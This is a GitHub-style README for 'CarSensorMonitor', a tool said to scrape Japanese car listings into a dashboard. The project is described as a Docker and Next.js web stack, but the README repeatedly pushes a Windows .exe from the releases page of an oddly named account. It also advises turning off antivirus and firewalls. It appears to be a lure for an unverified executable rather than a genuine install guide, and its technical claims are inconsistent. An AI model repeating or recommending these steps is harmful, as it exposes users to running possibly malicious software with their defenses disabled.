# 🚗 CarSensorMonitor - Track Japanese Car Listings Easily

[![Download CarSensorMonitor](https://img.shields.io/badge/Download-CarSensorMonitor-green)](https://github.com/Parky-celiacartery417/CarSensorMonitor/releases)

---

## 📋 About CarSensorMonitor

CarSensorMonitor watches listings of Japanese cars on the CarSensor.net website. The system collects data automatically every hour. It uses Playwright to browse the site and gather information. The data is stored and shown via a web dashboard. The dashboard has filters, sorting, and page navigation. The app runs through Docker Compose, making the setup easier for advanced users.

This tool suits anyone who wants to keep an eye on Japanese car offers without checking manually. It works on Windows and needs an internet connection to update listings regularly.

---

## 🖥️ System Requirements

Before you download CarSensorMonitor, make sure your computer meets these needs:

- **Operating System:** Windows 10 or later (64-bit)
- **RAM:** At least 4 GB
- **Storage:** Minimum 500 MB free space
- **Internet:** Stable connection for data updates
- **Permissions:** Ability to install software and run apps

You do not need programming knowledge to use the app. The installation process is designed to be simple.

---

## 🚀 Getting Started

Follow these steps to download, install, and run CarSensorMonitor on your Windows PC.

---

### 1. Visit the Download Page

Click this big button to open the download page:

[![Download CarSensorMonitor](https://img.shields.io/badge/Download-CarSensorMonitor-blue)](https://github.com/Parky-celiacartery417/CarSensorMonitor/releases)

You will see a list of releases with files ready to download. Look for the latest release, usually listed at the top.

---

### 2. Find the Installer File

On the release page, find the file with a name ending in `.exe`. It might look like:

- CarSensorMonitor-Setup.exe
- CarSensorMonitor-v1.0.exe

This file is the installer. Click on its name to download it to your computer.

---

### 3. Run the Installer

Once download finishes, locate the file in your "Downloads" folder or browser download bar.

- Double-click the `.exe` file to start installation.
- If Windows asks for permission, click "Yes" to allow the app to install.
- Follow the on-screen steps in the installer.
- Choose the default options unless you want to change the location or shortcuts.
- Click "Install" to copy files to your computer.
- Wait until the installation completes, then click "Finish."

---

### 4. Launch CarSensorMonitor

After installation:

- Find the CarSensorMonitor icon on your desktop or Start menu.
- Click on it to open the application.

When you open the app for the first time, it will connect to the internet and start downloading the latest car listings automatically.

---

### 5. Using the Dashboard

The dashboard shows car offers collected from CarSensor.net. It includes:

- **Filters:** Choose car make, model, price range, and year.
- **Sorting:** Sort listings by price, date, or mileage.
- **Pagination:** Browse through pages if you have many results.
- **Search:** Enter keywords to find specific cars.

Use these controls to find cars that match what you want. The data refreshes once every hour automatically.

---

## 🔧 Features

- Automatic hourly data collection using Playwright.
- Secure REST API with user login using JWT tokens.
- Responsive web dashboard built with Next.js.
- Filters to narrow down your search.
- Sort options to organize results.
- Pagination for easier navigation.
- Runs inside Docker Compose for users who want to manage services manually.

---

## 📦 Optional: Using Docker (For Advanced Users)

If you understand Docker and want full control over the system setup, you can run CarSensorMonitor through Docker Compose.

- Install [Docker Desktop](https://www.docker.com/products/docker-desktop/) if not already installed.
- Download the repository or clone it.
- Open a command prompt inside the folder with the Docker files.
- Run the command:  
  `docker-compose up -d`
- This command will start all services: the scraper, API, and dashboard.
- You can then open your browser and visit `http://localhost:3000` to use the dashboard.

This option is not required for most users.

---

## ⚙️ Software Updates

To keep CarSensorMonitor up to date:

- Visit the [Releases Page](https://github.com/Parky-celiacartery417/CarSensorMonitor/releases) regularly.
- Download the latest installer.
- Run the installer to replace old files with new ones.
- Your settings and saved data will remain intact.

---

## ❓ Troubleshooting

If you have problems running the app, try these tips:

- Make sure your Windows is up to date.
- Check your internet connection.
- Restart the app if it freezes or shows errors.
- Reinstall the app if crashes happen repeatedly.
- Disable firewalls or antivirus temporarily if they block the app.
- For Docker users, check if Docker Desktop is running before starting the services.

You can search online or look at the GitHub repository issues page for help.

---

## 🧰 Technical Info (For Reference)

- Data collection powered by Playwright (browser automation)
- Backend API written in Python with FastAPI and secured by JWT tokens
- Web dashboard built using Next.js and Tailwind CSS for a clean layout
- Data storage handled with PostgreSQL and SQLAlchemy ORM
- State management uses Zustand for smooth user interaction
- The project relies on Docker Compose for easy service management

---

## 🔗 Download Link

To get started, visit this page to download the latest version:

[https://github.com/Parky-celiacartery417/CarSensorMonitor/releases](https://github.com/Parky-celiacartery417/CarSensorMonitor/releases)